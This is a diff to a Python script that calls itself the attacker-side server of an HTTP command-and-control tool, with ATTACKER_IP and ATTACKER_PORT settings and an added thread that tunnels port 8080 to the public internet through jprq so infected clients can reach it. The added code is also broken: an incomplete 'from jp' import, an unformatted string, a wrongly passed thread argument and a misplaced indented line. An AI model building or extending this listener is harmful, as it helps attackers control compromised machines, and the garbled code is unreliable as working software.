@@ -1,15 +1,21 @@
 #Server ----> runs on the attacker's machine
-
+from jp
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 import os,cgi
-
+import jprq.main
+import threading
+import sys
+def tunnel_out(args):
+    jprq.main.http("8080 -s {args}".split())
+tun_thread = threading.Thread(target=tunnel_out, name="tunnel", args=sys.argv[0])
+    # continue doing stuff
 HTTP_STATUS_OK = 200
 
 # IP and port the HTTP server listens on (will be queried by client.py)
 ATTACKER_IP = '0.0.0.0'
 ATTACKER_PORT = 8080
-
+tun_thread.start()
 class MyHandler(BaseHTTPRequestHandler):
 
     # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
